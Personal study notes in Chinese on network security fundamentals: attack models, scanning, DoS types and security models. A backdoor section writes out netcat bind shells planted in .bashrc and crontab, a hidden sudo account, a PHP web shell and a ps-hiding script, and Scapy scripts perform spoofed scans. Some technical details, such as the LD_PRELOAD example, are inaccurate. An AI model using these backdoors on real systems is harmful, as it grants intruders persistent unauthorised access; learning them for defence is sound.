7.9
---
## 现状和问题
APT攻击 Advanced Persistent Threat   
西北工业大学2022 https://www.cverc.org.cn/head/zhaiyao/news20220905-NPU.htm  
恶意代码  
病毒Virus（需要宿主文件，依赖用户行文传播），  
蠕虫Worm（独立运行的软件，不需用户行为），  
木马TrojanHorse（伪装成合法程序，依赖用户安装），  
僵尸网络Botnet（大量受控计算机组成集中控制），  
逻辑炸弹（隐藏在合法程序中，依赖特定条件触发），  
Rootkit（深度嵌入操作系统，隐蔽性强），  
勒索软件Ransomware（加密文件或锁定系统，要求赎金）。
## 基本属性
和之前的CIA，A不一样？  
机密性  
完整性   
## 基本功能 
安全防御 安全监测 安全应急 安全恢复
## 基本技术需求
### 物理环境 
### 网络信息安全认证 
### 访问控制
限制非法，合法越权
### 安全保密
安全分区，数据防泄露技术DLP（防止不当共享传输），物理隔离，漏洞扫描。  
### 安全漏洞扫描
### 恶意代码防护
网上文件下载、电邮、网页、文件共享
### 内容安全
垃圾邮件过滤，IP、URL过滤，自然语言分析处理。
### 安全监测与预警
发现入侵活动，检查保护措施的有效性
### 安全应急响应

## 安全管理
- 对象：设备、通信协议、操作系统、网络服务，软硬件总和。  
- 技术：风险分析、密码算法、身份认证、访问控制、安全审计、漏洞扫描、防火墙、入侵检测、应急响应等。
- 方法：风险管理、等级保护、纵深防御、层次化保护、应急响应、PDCA（plan-do-check-act）。  
PDCA：质量管理办法，循环四步，螺旋上升，未解决的放入下一个循环。
- 法规：ISO/IEC27001，中华人民共和国网络安全法，国家密码法，GB17859，GB/T22080，网络安全等级保护相关条例。
https://www.27001.org.cn/index/iso-iec-27001  
GDPR General Data Protection Regulation
https://www.gdprsummary.com/gdpr-summary/
CC Common Criteria
- 要素：网络管理对象、网络威胁、网络脆弱性、网络风险、网络保护措施。实际上是风险控制。通过对网络管理对象的威胁和脆弱性进行分析，确定网络管理对象的价值、网络管理对象威胁发生的可能性、网络管理对象的脆弱成都，从而确定网络管理对象的风险等级，然后选取合适的安全保护措施，降低网络管理对象的风险。  
### 安全管理对象分类
硬件：计算机、网络设备、传输介质及转换器、输入输出设备、监控设备；软件：网络操作系统、网络通信软件、网络管理软件；存储介质：硬盘；*网络信息资产：网络IP地址，网络物理地址、网络用户账号、口令、网络拓扑结构图。* 支持保障系统：消防、通信系统等。  
### 安全威胁
### 脆弱性：
计算系统中与安全策略相冲突的的状态或错误，将导致攻击者非授权访问、假冒用户执行操作及拒绝服务。  
### 安全风险。
避免风险，物理隔离。转移风险，购买商业保险、外包。减少威胁，安装防病毒软件包。消除脆弱点，操作系统打补丁。减少影响，备份/应急预案。风险监测。
### 管理流程
1 确定管理对象  
2 评估对象价值  
3 识别对象威胁  
4 识别脆弱性  
5 确定风险等级  
6 制订防范体系和措施  
7 实施措施  
8 运行/维护网安设备、配置
### 信息安全管理系统在生命周期中提供的支持，表p31
### 管理工具，评估
### 法律
网络安全等级保护  
安全管理制度和操作流程；采取防范病毒和攻击的技术措施；采取监测、记录网络运行状态、安全事件的技术措施，留存网络日志不少于六个月（一年）；数据分类、备份、加密。  
主要工作概括为：定级、备案、建设整改、等级测评、运营维护。
### 国家密码管理制度
### 会议 期刊 网站等

# 第一章总结
### 基本概念，现状和问题
### 网络信息安全基本属性、基本目标、基本功能
### 基本技术需求，管理概念、要素、流程、方法
### 法律和政策文件
### 科技信息获取来源


# 网络攻击原理与常用方法
## 概念
导致网络系统安全属性受到破坏。  
### 分类：  
- 信息泄露攻击；未经授权获取敏感信息，如钓鱼、窃听、中间人攻击MITM（会话劫持，操纵通信过程）、sql注入  
- 完整性破坏攻击；修改或破坏系统数据使其不再可信，如恶意软件、sql注入、XSS  
- 拒绝服务攻击；使系统无法为合法用户提供正常服务，如DDoS，flooding atk，Ping of Death  
- 非法使用攻击；未经授权使用系统资源，挖矿 发送垃圾邮件 大型计算等。如特洛伊木马、权限提升攻击
### 攻击者
### 攻击工具
- 用户命令。ping, netstat, telnet, ssh等用于检查网络连接、探测开放端口，初步侦查和信息收集。  
- 脚本/程序。
- 自治主体：攻击者初始化一个程序或者程序片段，独立执行漏洞挖掘。僵尸网络（Botnets），自主运行的蠕虫，利用机器学习算法进行漏洞挖掘的工具。
- 电磁泄漏。通过窃取目标设备的电磁信号来窃取信息。
### 攻击访问
攻击者为达到攻击目的，一定要访问目标网络系统。
### 攻击效果
破坏信息，信息泄密，窃取服务，拒绝服务。
### 攻击意图

## 网络攻击模型
攻击树模型（树结构来描述攻击者可能采取的步骤）；Mitre Att&ck 模型；网络杀伤链Kill Chain模型。  
### Mitre Att&ck攻击模型：  
Adversarial Tactics, Techniques and Common Knowledge 一个知识库，详细描述了网络攻击者的行为和技术。分为多个矩阵，每个对应不同的技术领域。矩阵分为战术Tactics, 技术Techniques, 子技术Sub-techniques。  
- 初始访问（Initial Access）：获得进入目标系统的第一步，如网络钓鱼、利用漏洞等。
- 执行（Execution）：在受害者系统上执行恶意代码。
- 持久性（Persistence）：确保攻击者在系统上保持持续访问。
- 权限提升（Privilege Escalation）：获得更高权限的账户或系统访问权限。
- 防御规避（Defense Evasion）：躲避安全防护措施，如杀毒软件、入侵检测系统等。
- 凭证访问（Credential Access）：获取账户凭证以访问其他系统。
- 发现（Discovery）：收集有关受害者系统和网络的详细信息。
- 横向移动（Lateral Movement）：在网络内从一个系统移动到另一个系统。
- 数据收集（Collection）：收集有价值的数据。
- 指挥与控制（Command and Control）：与被入侵系统之间建立通信渠道。
- 外泄（Exfiltration）：将数据从受害者网络传输到攻击者控制的地方。
- 影响（Impact）：攻击者对目标系统进行破坏性操作，如数据破坏、服务中断等。
通过以下步骤应用模型：威胁建模（构建攻击情景），安全监控（利用矩阵，建立针对性的安全监控规则和检测机制），攻击模拟（红队活动/自动化工具模拟已知攻击技术，测试防御能力），培训提高意识。
https://www.ibm.com/cn-zh/topics/mitre-attack  
https://attack.mitre.org/
## 网络攻击发展
- 红色代码 Code Red 利用Buffer Overflow漏洞攻击win2000.
- 冲击波 Blaster 利用DCOM RPC接口的Buffer Overflow漏洞攻击win2000和win XP。
- 永恒之蓝 EternalBlue 漏洞利用工具包Exploit Kit，利用SMBv1协议中的缓冲区溢出漏洞攻击Win7，Win Server2008等。  
红色代码和冲击波都是典型的蠕虫攻击，通过自动扫描和感染其他系统来快速传播。
## 网络攻击一般过程
### 隐藏攻击源
- 利用被侵入的主机作为跳板
- 免费代理网关
- 伪造IP地址
- 假冒用户账号
### 收集攻击目标信息
- 目标系统一般信息。IP，DNS，邮件服务器，网站服务器，操作系统、数据库、应用软件类型及版本号。
- 配置信息。是否禁止root远程登陆、缺省用户名/默认口令等。
- 安全漏洞信息。有漏洞的软件及服务。
- 安全措施信息。安全厂商、安全产品。
- 用户信息。
### 挖掘漏洞信息
- 系统/应用服务软件漏洞
- 主机信任关系漏洞 Host Trust Relationship Vulnerability  
利用CGI漏洞，读取/etc/hosts.allow文件。  
CGI Common Gateway Interface指Web服务器上运行的CGI脚本，用于生成动态内容和与客户端交互，建议使用Django，Flask，ExpressJS等替代。
常见：`/etc/hosts.allow` 和`/etc/hosts.deny`
- 使用者  
邮件钓鱼，弱口令，U盘摆渡

7.10
---
- 通信协议
分析使用的协议寻找漏洞。IP协议中的地址伪造漏洞（X-Forwarded-For）、Telnet/Http/Ftp/POP3/SMTP等协议的明文传输信息漏洞。  
-- IP Spoofing，修改IP数据包的源地址字段，伪装成另一个合法IP。  
-- 例如：`hping3 -a 192.168.1.1 -c 4 192.168.1.2`使用`hping3`工具，发送4个伪造源地址为`192.168.1.1`的IP数据包到目标地址`192.168.1.2`。  
-- 防护：在路由器防火墙上配置反向路径过滤Reverse Path Filtering；采用IPSec安全协议，提供数据包认证和加密。  
-- 明文传输信息漏洞Cleartext Transmission Vul，网络通信中数据以明文传输，HTTP,FTP,Telnet默认情况下都以明文传输。防范：使用SSL/TLS加密HTTP通信。使用安全的SSH协议替代Telnet，用于远程登陆和文件传输。
-- SSL/TLS：加密通信+身份验证+数据完整性。

- 网络业务

### 获取目标访问权限  
获取管理员口令，针对root用户的口令攻击。  
系统管理漏洞，不仔细，错位配置、文件许可。  
管理员意外运行木马，如篡改后的LOGIN程序等。
窃听管理员口令

### 隐蔽攻击行为
隐藏行踪  
- 连接隐藏  
-- 冒充其他用户  
-- 修改logname环境变量。logname显示当前登录用户名称，修改`export LOGNAME=another_user`。判断方法：检查系统的环境变量设置，使用`env`/`printenv`，如：`env|grep LOGNAME`，对比当前登录用户和`LOGNAME`是否一致  
-- 修改utmp日志文件。`utmp`文件记录系统上所有当前登录的用户。攻击者可修改`utmp`来删除登陆记录，通常位于`/var/run/utmp`和`/var/log/utmp`，常用工具`utmpdump`和`wtmpfix`。判断方法：使用`last`,`who`等命令查看登陆记录检查；比较`utmp`和其他日志文件（`auth.log`,`secure`）是否一致；实时监控系统日志，日志管理工具`rsyslog`, `syslog-ng`；文件完整性工具检查`Tripwire`。  
```bash
# 检查utmp文件中是否有非法修改
last | grep "reboot" | awk '{print $1}' | sort | uniq -c

# 检查环境变量是否被修改
if [ "$LOGNAME" != "$(whoami)" ]; then
  echo "Warning: LOGNAME environment variable has been modified"
fi

```
- 进程隐藏，？重定向减少ps给出的信息量  
-- 通过修改或替换`ps`命令，使其输出被重定向到一个文件或其他位置，不在终端显示。
```bash
# 创建一个伪装的ps脚本,输出重定向到/dev/null
echo -e '#!/bin/bash\nps $@ > /dev/null' > /usr/local/bin/ps
chmod +x /usr/local/bin/ps
export PATH=/usr/local/bin:$PATH
```
-- 还可以修改环境变量（？）。修改环境变量`LD_PRELOAD`,攻击者可以加载自定义共享库来拦截并修改ps命令。
```bash
# 创建一个自定义的共享库来拦截ps命令
echo -e '#include <stdio.h>\nvoid ps(void) { printf("No process found\\n"); }' > myps.c
gcc -shared -o myps.so myps.c
export LD_PRELOAD=/path/to/myps.so
ps
```
编写&编译myps.c，设置`LD_PRELOAD`环境变量的值为自定义共享库路径。当加载程序时，系统会优先加载指定的共享库，以拦截和替代原有函数。
共享库shared library在多个程序见共享的代码库，通常以.so结尾，如libc.so。
- 文件隐蔽，利用字符串相似或修改文件属性

### 实施攻击
### 开辟后门
- 放宽文件许可
- 重新开放不安全的服务（REXD面向互联网系统的不安全协议，使用了弱身份验证,TFTP文件传输，传输数据不受保护）
- 修改系统配置，启动文件，网络服务配置文件
- 替换系统本身的共享库文件
- 安装木马
- 安装嗅探器？👉Sniffer网络分析工具，捕获和监视网络数据包，获取敏感信息如用户名、密码、信用卡号等。  
-- 嗅探器工作在混杂模式Promiscuous Mode，可以捕获经过网络接口的所有数据包，而不仅仅是发给它的。  
-- 检测网络接口是否处于混杂模式：
```bash
ifconfig eth0 | grep PROMISC
ip link show eth0
```
- 建立隐蔽信道  

## 常见的开辟后门手段
### 添加用户或提权：
攻击者可以创建一个具有管理员权限的隐藏用户，从而确保持久访问。
```bash
useradd -m -d /home/hiddenuser -s /bin/bash hiddenuser
echo 'hiddenuser:password' | chpasswd
usermod -aG sudo hiddenuser
```
### 修改系统文件：

修改关键系统文件，如.bashrc、.profile、/etc/passwd、/etc/shadow等，以便在用户登录时自动执行恶意代码。
```bash
echo 'nc -lvp 4444 -e /bin/bash' >> /home/username/.bashrc
```
### 安装后门程序：

安装如nc（Netcat）、backdoor、rootkit等工具，以便远程控制系统。
```bash
nc -lvp 4444 -e /bin/bash
```
### 开放端口和修改防火墙规则：

开放一个新的端口供远程访问，并修改防火墙规则以允许流量通过。
```bash
iptables -A INPUT -p tcp --dport 4444 -j ACCEPT
```

### 利用Web Shell：

在受攻击的Web服务器上上传Web Shell（如PHP、ASP、JSP脚本），攻击者可以通过Web Shell远程执行命令。
```php
<?php system($_GET['cmd']); ?>
```
### 计划任务和启动项：

使用cron或systemd等工具在系统启动或特定时间点执行恶意代码。
```bash
echo '@reboot root /usr/bin/nc -lvp 4444 -e /bin/bash' >> /etc/crontab
```

## 清除痕迹
避免被安全管理员或IDS发现。  
- 篡改日志文件中的审计信息
- 改时间
- 删除/停止审计服务进程
- 干扰IDS
- 修改完整性检测标签？

## 攻击常见技术
### 端口扫描
完全连接扫描，三次握手  
半连接扫描，两次握手   
。。。

### TCP三次握手
1 SYN 客户端向服务端发SYN包，初始序列号ISN   
2 SYN-ACK 服务器回SYN-ACK，服务器序列号
3 ACK 客户端发ACK确认

- 完全连接扫描 Full Connect Scan：
完成SYN, SYN-ACK, ACK，会被服务器日志记录。
- 半连接扫描 Half-Open Scan:
客户端只发SYN包，服务器回SYN-ACK后，客户端立刻发送RST（Reset）包，不会被服务器记录。
- SYN扫描
```python
from scapy.all import *

def syn_scan(target, ports): #目标ip地址，端口列表
    for port in ports:
        #创建并发送SYN：目标地址；封装一个TCP包；flags设置为S表示SYN包；sr1发送SYN包并等待一个响应包response
        syn_packet = IP(dst=target)/TCP(dport=port, flags='S')
        response = sr1(syn_packet, timeout=1, verbose=0)
        
        #没收到响应包，端口被过滤/关闭
        if response is None:
            print(f"Port {port} is filtered or closed.")

        #响应包包含TCP，标志位是0x12即SYN-ACK，表示端口开放
        elif response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:
            print(f"Port {port} is open.")
            #创建RST包，发送以终止连接
            rst_packet = IP(dst=target)/TCP(dport=port, flags='R')
            send(rst_packet, verbose=0)
        #响应包包含TCP层，标志位是0x14（RST-ACK），表示端口关闭
        elif response.haslayer(TCP) and response.getlayer(TCP).flags == 0x14:
            print(f"Port {port} is closed.")

# Example usage
target_ip = "192.168.1.1"
ports_to_scan = [22, 80, 443]
syn_scan(target_ip, ports_to_scan)

```
- ID头信息扫描：通过检查IP头部的ID标识字段来推测端口的开放状态。例如，找一个闲置的dumb主机B，伪装成B向目标主机C发包，通过比较B扫描前后的ID字段来判断主机C的端口情况。

todo：第一章安全管理方法扩展PDCA，管理依据中的几个条例再看看。第二章攻击模型，MITRE ATT&CK主要看看，p43 APT举的例子看看。

7.11
---
昨日todo:
✔ PDCA ✔ ISO+GDPR+CC ✔ MITRE ATT&CK ✔ 著名攻击

-   
1. 获取初始IP ID：主机A向dumb主机B发送连续PING包，以获取B的当前IP ID字段。  
2. 发送SYN包：主机A伪装成主机B的IP地址，向目标主机C的多个端口发送SYN包。
3. 比较响应：主机A再次向dumb主机B发送PING包，获取新的IP ID字段值。通过比较扫描前后B的IP ID字段变化，推测目标主机C上端口的开放状态。如果ID字段值增加了多个（表示在第二步期间B发送了多个响应包），则表示目标端口开放；否则目标端口关闭。



```python
from scapy.all import *

#向目标主机C发送ICMP Echo请求（PING），并返回响应包的IP头部ID字段值response.id。
def get_ip_id(target):
    pkt = IP(dst=target)/ICMP()
    response = sr1(pkt, timeout=1, verbose=0)
    if response is not None:
        return response.id
    return None

# 发送伪装SYN包函数。源地址伪装成source，目标地址target。
def send_syn_spoofed(source, target, ports):
    for port in ports:
        syn_packet = IP(src=source, dst=target)/TCP(dport=port, flags='S')
        send(syn_packet, verbose=0)

# ID扫描
def id_scan_with_dumb_host(source, target, ports):
    # Step 1: 获取dumb主机的初始 IP ID
    initial_id = get_ip_id(source)
    if initial_id is None:
        print("Failed to get initial IP ID from dumb host.")
        return

    # Step 2: 发送 SYN 包。伪装成dumb主机source，发送SYN包到目标主机target的多个端口。
    send_syn_spoofed(source, target, ports)

    # Step 3: 获取最终 IP ID。获取dumb主机的最终IP头部ID字段。
    final_id = get_ip_id(source)
    if final_id is None:
        print("Failed to get final IP ID from dumb host.")
        return
    
    # 比较 ID 值。推测目标主机target端口的状态。
    if final_id == initial_id + 1:
        print(f"Ports {ports} are likely closed.")
    else:
        print(f"Ports {ports} are likely open.")

# Example usage
dumb_host_ip = "192.168.1.2"
target_ip = "192.168.1.3"
ports_to_scan = [22, 80, 443]
id_scan_with_dumb_host(dumb_host_ip, target_ip, ports_to_scan)

```

todo：隐蔽行为，后门和清楚痕迹等还有问号

7.12
---
昨日todo：✔主机通信信任漏洞 ✔通信协议漏洞 ✔隐蔽攻击行为 ✔实施攻击

# 端口扫描
## 隐蔽扫描

todo：
- 7.10 IP Spoofing时，原理，为什么伪装成别的IP之后，还可以发送回原机器，在其他的层上是否可行
- 端口扫描发SYN包时，写的是TCP协议，用UDP协议是否可行


7.15
---
上周todo问题：
##### IP Spoofing  
- IP Spoofing，攻击者伪造数据包的源IP，目标主机会将响应数据包发送到伪装的IP。攻击者不会直接收到目标主机返回的数据包。  
- 在某些高级攻击中，攻击者可间接获得返回的数据   
*（比如同一LAN中，可使用wireshark捕获伪造IP地址的流量）*。  
- IP spoofing通常用于不需要响应的攻击。如Dos或反射攻击   
*（反射攻击：发送带有伪造源IP地址/受害者IP地址的请求数据包到第三方服务器，服务器会将响应数据包发送给受害者，从而达到攻击受害者的目的。）*
- IP Spoofing运作在osi第三层网络层，数据包的源IP和目的IP地址被设置和处理。在网络层，数据包通过路由器进行转发，IP Spoofing不影响路由。
- IP Spoofing可以同于多种基于IP协议的攻击，如TCP、UDP。对于tcp数据包，攻击者可能会伪造SYN包，无法接到SYN-ACK包，难以完成三次握手，用来进行SYN洪水攻击。而对于UDP数据包，攻击者可以更容易地伪造源IP地址，因为UDP是无连接协议，不需要建立连接。可用与UDP洪水攻击和反射攻击

##### 扫描，UDP协议
- SYN扫描, UDP协议没有三次握手机制无SYN扫描。
- ID头信息扫描，使用UDP。
```python
from scapy.all import *

def get_ip_id(host):
    pkt = IP(dst=host)/ICMP()
    response = sr1(pkt, timeout=1, verbose=0)
    if response is not None:
        return response.id
    return None

def send_udp_spoofed(fake_source, target, ports):
    for port in ports:
        udp_packet = IP(src=fake_source, dst=target)/UDP(dport=port)
        send(udp_packet, verbose=0)

def id_scan_with_dumb_host_udp(dumb_host, target, ports):
    # Step 1: 获取 dumb 主机的初始 IP ID
    initial_id = get_ip_id(dumb_host)
    if initial_id is None:
        print("Failed to get initial IP ID from dumb host.")
        return

    # Step 2: 伪装成 dumb 主机向目标主机发送 UDP 包
    send_udp_spoofed(dumb_host, target, ports)

    # Step 3: 获取 dumb 主机的最终 IP ID
    final_id = get_ip_id(dumb_host)
    if final_id is None:
        print("Failed to get final IP ID from dumb host.")
        return
    
    # 比较初始和最终 ID 值
    if final_id == initial_id + 1:
        print(f"Ports {ports} are likely closed.")
    else:
        print(f"Ports {ports} are likely open.")

# Example usage
dumb_host_ip = "192.168.1.2"
target_ip = "192.168.1.3"
ports_to_scan = [53, 67, 123]
id_scan_with_dumb_host_udp(dumb_host_ip, target_ip, ports_to_scan)
```

##### UDP扫描
发送UDP数据包  
分析响应：如果端口关闭，目标主机通常会返回一个ICMP端口不可达消息(Type 3, Code 3)。如果端口开放，通常不会有响应。（？）

```python
def udp_scan(target, ports):
    for port in ports:
        udp_packet = IP(dst=target)/UDP(dport=port)
        response = sr1(udp_packet, timeout=2, verbose=0)
        
        if response is None:
            print(f"Port {port} is open|filtered (no response).")
        elif (response.haslayer(ICMP) and 
              response.getlayer(ICMP).type == 3 and 
              response.getlayer(ICMP).code == 3):
            print(f"Port {port} is closed (ICMP port unreachable).")
        else:
            print(f"Port {port} is open|filtered (unexpected response).")
```

#### 隐蔽扫描
能成功绕过IDS、防火墙和监视系统等安全机制。FIN Scan，XMAS Scan，NULL Scan都属于。

#### SYN|ACK扫描
向目标主机的端口发送SYN-ACK数据包。如果端口关闭，返回RST *（收到TCP RST包，0x14）*，如果开放，通常无响应。（没响应也可能是过滤了）。  

#### FIN扫描
向目标主机发送FIN数据包，RESET说明关闭，无响应说明开放。

#### ACK扫描
向目标主机发送FIN数据包，查看反馈数据包的TTL值和WIN值。  
- TTL：Time to Live。IP包头中的一个字段，用来限制数据包在网络中的生存时间。每经过一个路由器，TTL值就会减1。减到0数据包丢弃。初始值由操作系统决定，一般是64，128，255。RST包的TTL值较小，通常表示数据包已经经过了多个路由器。  
- WIN: Window Size。用于控制发送方和接收方之间的数据传输速率。如返回的RST包的窗口大小为0，通常表示这个端口被防火墙过滤或主机没有准备好接受数据。  

开放端口：

TTL：开放端口的 TTL 通常较小，表示数据包经过的路由器较少。因为这些数据包通常直接由目标主机返回。  
窗口大小：开放端口的窗口大小通常大于 0，表示目标主机准备接收更多的数据。  

过滤端口：

TTL：过滤端口的 TTL 通常较大，表示数据包经过了更多的路由器。这是因为防火墙可能会在网络路径的中间位置过滤数据包。  
窗口大小：过滤端口的窗口大小通常为 0，表示目标主机没有准备接收数据，或者防火墙已经过滤了这些数据包。

#### NULL扫描
发送数据包ACK,FIN,RST,SYN,URG,PSH标志位全部置空。

#### XMAS扫描
标志位全部置为1.

### 口令破解
## 缓冲区溢出
- 栈缓冲区溢出（Stack Buffer Overflow）：

发生在栈上的缓冲区，攻击者可以覆盖栈帧中的返回地址，使程序跳转到恶意代码位置执行。
- 堆缓冲区溢出（Heap Buffer Overflow）：

发生在堆上的缓冲区，攻击者可以覆盖堆中的管理数据结构，改变程序的内存分配行为，执行恶意代码。

### 恶意代码
## 拒绝服务
本质：延长服务等待时间。  
特点：p51
- 难确认性
- 隐蔽性
- 资源有限性
- 软件复杂性

### 同步包风暴 SYN Flood
向Source IP发送大量Syn Packet
### UDP洪水 UDP Flood
用Chargen和Echo互相发送大量数据占满带宽。  
- Chargen 服务  
Chargen（Character Generator Protocol）是一种测试和调试协议，定义在 RFC 864 中。它运行在 UDP 和 TCP 端口 19 上。当收到请求时，Chargen 服务会返回一个包含任意字符的字符串。这个字符串的长度取决于请求的协议和具体实现。

- Echo 服务  
Echo（Echo Protocol）是一种简单的协议，定义在 RFC 862 中。它运行在 UDP 和 TCP 端口 7 上。当收到请求时，Echo 服务会将收到的数据原封不动地返回给发送者。

### Smurf攻击
- 攻击者发送伪造的 ICMP Echo 请求：  
攻击者生成一个 ICMP Echo 请求数据包（Ping），其源地址被伪造成受害者的 IP 地址，然后将该数据包发送到目标网络的广播地址。

- 网络中的每台主机回复 ICMP Echo 回复：  
目标网络中的每台主机都会接收到这个广播的 ICMP Echo 请求，并且认为这是来自受害者的合法请求，于是每台主机都会发送 ICMP Echo 回复数据包回到伪造的源地址（即受害者的 IP 地址）。

- 受害者收到大量 ICMP Echo 回复：  
受害者的网络将会被大量的 ICMP Echo 回复数据包淹没，消耗其带宽和计算资源，导致网络拥塞甚至瘫痪。  
##### 防御措施：
禁用广播地址的ICMP回应

### 垃圾邮件攻击
邮件炸弹mail bomb程序发送垃圾信息，耗尽信箱磁盘空间。

### 消耗CPU和内存资源的拒绝服务攻击
#### Hash DoS
通过制造大量hash冲突，导致hash表性能急剧下降，从而消耗服务器的CPU和内存资源。  
防御措施：使用更安全的Hash Fun，如SipHash，限制请求频率，输入验证和过滤。
### 死亡之ping
通过发送特制的大于正常最大长度的ICMP Echo请求（Ping）数据包，导致目标系统缓冲区溢出。 ICMP包小于64KB（65536字节 ）。 *IP协议中允许的最大数据包长度是65535字节*
ICMP Internet Control Message Protocol通过IP协议进行传输，不依赖TCP/UDP。

### 泪滴攻击
利用IP数据包传输时分解和重组的弱点。  
IP头中两个字段和分片相关：
- 片段偏移量 Fragment Offset/Offset Field，表示片段在原始数据包中的位置。
- 更多片段（MF）标志，表示是否有更多的片段。

泪滴攻击，加入过多或不必要的偏移量字段，通过发送具有重叠/不连续片段偏移量的畸形分片数据包，使系统在重组数据包时出现错误。

### DDoS
植入后门程序从远程遥控攻击。攻击者从多个已入侵的跳板主机控制数个代理攻击主机，通常是僵尸网络。  
著名例子：Trinoo，TFN， TFN2K， Stacheldraht。  
*【待查】*

## 网络钓鱼
## 网络窃听
## SQL注入
web服务三层架构模式：浏览器+Web服务器+数据库。sql命令通过Web表单的输入域，欺骗服务器执行命令。  
（后面章节还有。）
## 社会工程
## 电子监听
远距离监视电磁波传送过程
## 会话劫持
比如工作完成后没有切断主机，攻击者劫持拥有合法权限。
## 漏洞扫描
常见漏洞扫描技术：CGI漏洞扫描、弱口令扫描、操作系统漏洞扫描、数据库漏洞扫描等。  
*CGI：通用网关接口。网页的表单和程序之间通信的一种协议。*
## 代理技术
代理服务器作攻击跳板。
## 数据加密
与攻击相关的内容加密或立刻销毁。

7.17
---
# 黑客常用工具
## 扫描器
- NMAP 开源，检测开放端口，主机操作系统类型及提供的网络服务。
- Nessus
- SuperScan
## 远程监控
受害机器上运行一个代理软件。黑客电脑运行管理软件，受害机器受控于管理端。常用：冰河、网络精灵、Netcat。
## 密码破解
口令猜测（弱口令），穷举，撞库。常用：John the Ripper, LOphtCrack.
## 网络嗅探器 Network Sniffer
截获网络信息包，对加密信息包破解，分析包内数据。  
Tcpdump, DSniff, WireShark等。
## 渗透工具箱
### Metasploit
### BackTrack5
*（待查）*
# 攻击案例分析
## 2000年DDoS攻击Yahoo
## W32.Blaster.Worm P58
漏洞：“RPC DCOM漏洞”，利用漏洞传播的网络蠕虫，导致系统运行不稳定，系统不断重启，缓冲区溢出漏洞。RPC远程过程调用，DCOM分布式组件对象模型。  
传播：利用TCP135端口  
TCP 4444绑定一个cmd.exe后门  
UDP 69监听，收到请求后把Msblast.exe发送。  
对windowsupdate.com发送tcp同步风暴拒绝服务攻击，防止更新。
## 乌克兰电力系统。
钓鱼邮件。BlackEnergy恶意代码文件。诱导用户打开，激活木马，安装ssh后门和系统自会工具Killdisk。

# 本章小结
### 网络攻击原理与常用方法
网络攻击是指破坏网络系统安全属性的行为，主要包括信息泄露、完整性破坏、拒绝服务和非法使用等类型。

- 信息泄露攻击：未经授权获取敏感信息，如钓鱼、窃听、中间人攻击（MITM）、SQL注入等。
- 完整性破坏攻击：修改或破坏系统数据使其不再可信，如恶意软件、SQL注入、XSS。
- 拒绝服务攻击：使系统无法为合法用户提供正常服务，如DDoS、flooding攻击、Ping of Death。
- 非法使用攻击：未经授权使用系统资源，如挖矿、发送垃圾邮件、大型计算等，如特洛伊木马、权限提升攻击。
### 攻击者和攻击工具
攻击者使用多种工具和技术进行攻击，包括：

- 用户命令：如ping、netstat、telnet、ssh等，用于检查网络连接、探测开放端口、初步侦查和信息收集。
- 脚本/程序：自动化的攻击脚本和程序，用于漏洞挖掘和攻击。
- 自治主体：如僵尸网络、蠕虫、自主漏洞挖掘工具等。
- 电磁泄漏：通过窃取目标设备的电磁信号来窃取信息。
### 攻击访问与效果
攻击者通过访问目标网络系统来实现攻击，造成破坏信息、信息泄密、窃取服务和拒绝服务等效果。

### 攻击意图和模型
常见的网络攻击模型包括：

- 攻击树模型：描述攻击者可能采取的步骤。
- Mitre ATT&CK模型：详细描述网络攻击者的行为和技术，分为初始访问、执行、持久性、权限提升、防御规避、凭证访问、发现、横向移动、数据收集、指挥与控制、外泄和影响等战术。
- 网络杀伤链Kill Chain模型：描述攻击过程的各个阶段。
### 网络攻击发展

### 网络攻击通常包括以下步骤：

- 隐藏攻击源：利用被侵入的主机作为跳板、免费代理网关、伪造IP地址、假冒用户账号等。
- 收集攻击目标信息：包括目标系统的一般信息、配置信息、安全漏洞信息和安全措施信息。
- 挖掘漏洞信息：如系统/应用服务软件漏洞、主机信任关系漏洞、通信协议漏洞等。
- 获取目标访问权限：通过口令破解、系统管理漏洞、邮件钓鱼、弱口令等方法。
- 隐蔽攻击行为：通过修改系统日志、隐藏进程和文件等手段避免被发现。
- 实施攻击：开辟后门、安装木马、放宽文件许可、重新开放不安全的服务、修改系统配置、安装嗅探器、建立隐蔽信道等。
- 清除痕迹：避免被安全管理员或入侵检测系统发现，如篡改日志文件、改时间、删除/停止审计服务进程、干扰IDS等。
### 攻击案例分析
- 2000年Yahoo DDoS攻击：利用分布式拒绝服务攻击导致Yahoo服务瘫痪。
- W32.Blaster.Worm：利用RPC DCOM漏洞传播的网络蠕虫，导致系统运行不稳定。
- 2015年乌克兰电厂停电：通过钓鱼邮件引入BlackEnergy恶意代码，激活木马，安装SSH后门和KillDisk工具，导致大规模停电。
### 常见攻击技术
- 端口扫描：包括完全连接扫描、半连接扫描、SYN扫描、ID头信息扫描等。
- 隐蔽扫描：如FIN扫描、XMAS扫描、NULL扫描等。
- 口令破解：利用弱口令、穷举、撞库等方法破解口令。
- 缓冲区溢出：如栈缓冲区溢出、堆缓冲区溢出等。
- 拒绝服务：通过延长服务等待时间、消耗系统资源等方法实现拒绝服务攻击，如SYN洪水、UDP洪水、Smurf攻击等。

# 第四章 网络安全体系和网络安全模型
## 体系相关安全模型
### BLP机密性模型
安全标签包含两部分：安全级别（如公开、机密、绝密）和范畴集（有效领域和归属领域，如人事处、财务处）。
##### No Write Down
只能写入安全等级不低于自己等级的客体。防止高机密信息被泄露到低级别的文件中。
##### No Read Up
只能读取安全等级不高于自己等级的客体。  
通过强制访问控制Mandatory Access Control, MAC机制来实现。

### Biba模型
主要用于保护信息 **完整性**。  
完整性级别Integrity Levels（Low， Medium， High）
#### No Write Up
主体只能写入完整性级别不高于自身级别的客体。
#### No Read Down
高完整性级别用户不能读取低完整性级别的数据，防止高完整性用户受到低完整性数据的污染。
### 信息流模型 Information Flow Model
根据两个客体的安全属性控制从一个客体到另一个客体的信息传输。

### 信息保障模型 Information Assurance Models
确保信息系统可用性、保密性、完整性和非否认性的框架和方法。
### PDRR
- Protection, 加密机制，数据签名机制，访问控制机制，认证机制，信息隐藏，防火墙技术
- Detection, 入侵检测，系统脆弱性检测，数据完整性检测，攻击性检测
- Recovery, 数据备份，数据修复，系统恢复
- Response, 应急策略，应急机制，应急手段，入侵过程分析及安全状态评估。


7.18，7.19
---
todo: 继续前面IP Spoofing的问题。在同一个LAN中，如何捕获目标主机发送的数据包。在整个网络连接过程中，哪些环节是可以spoofing的？

### P2DR
policy, protection, detection, response
### WPDRRC
weaknesses, protection, detection, response, recovery, continuous improvement

### 能力成熟度模型 CMM
用于提升组织软件开发过程管理能力的框架。
- level1 Initial：随机、无序，成功依赖个人。
- l2 Managed：有基本项目流程。
- l3 Defined：文档化，标准化。
